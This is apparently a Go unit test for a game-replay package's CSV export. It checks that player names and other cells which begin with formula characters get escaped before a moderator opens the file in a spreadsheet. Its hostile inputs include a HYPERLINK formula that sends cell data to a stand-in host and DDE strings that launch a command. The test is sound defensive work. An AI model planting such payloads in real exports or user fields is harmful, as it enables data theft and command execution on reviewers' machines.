package replay

import (
	"encoding/csv"
	"strings"
	"testing"
)

// The player under review chooses their own name, and the moderator is the one
// who opens the export in a spreadsheet. Mutation: write p.Name without
// CSVSafeCell and the first assertion fails.
func TestPlayersCSVNeutralisesSpreadsheetFormulas(t *testing.T) {
	hostile := []string{
		`=HYPERLINK("http://evil.example/?x="&A1,"click")`,
		`@SUM(1+1)*cmd|' /C calc'!A0`,
		`+1+cmd|' /C calc'!A0`,
		`-2+3`,
		"\tleading tab",
		"\rleading return",
	}
	s := &MatchSummary{MatchID: "M"}
	for i, name := range hostile {
		s.Players = append(s.Players, &PlayerSummary{PlayerID: "=1+" + string(rune('0'+i)), Name: name, Team: "@team"})
	}
	s.Players = append(s.Players, &PlayerSummary{PlayerID: "echovr:7", Name: "Plain Name", Team: "blue", PingAvg: -1.5})

	rows, err := csv.NewReader(strings.NewReader(string(s.PlayersCSV()))).ReadAll()
	if err != nil || len(rows) != len(hostile)+2 {
		t.Fatalf("rows=%d err=%v", len(rows), err)
	}
	for r, row := range rows[1:] {
		for c, cell := range row {
			if cell == "" {
				continue
			}
			if strings.ContainsRune("=@\t\r", rune(cell[0])) {
				t.Errorf("row %d column %s starts a formula: %q", r, csvColumns[c], cell)
			}
			if (cell[0] == '+' || cell[0] == '-') && cell != "-1.5" {
				t.Errorf("row %d column %s starts a formula: %q", r, csvColumns[c], cell)
			}
		}
	}
	if got := rows[1][1]; got != "'"+hostile[0] {
		t.Errorf("name cell = %q, want the original text behind a single quote", got)
	}
	last := rows[len(rows)-1]
	if last[0] != "echovr:7" || last[1] != "Plain Name" || last[7] != "-1.5" {
		t.Errorf("ordinary cells were changed: %q", last)
	}
	for in, want := range map[string]string{"": "", "abc": "abc", "-12.50": "-12.50", "+3": "+3", "-inf": "'-inf", "-0x1p4": "'-0x1p4", "=1": "'=1", "\x00x": "'\x00x"} {
		if got := CSVSafeCell(in); got != want {
			t.Errorf("CSVSafeCell(%q) = %q, want %q", in, got, want)
		}
	}
}
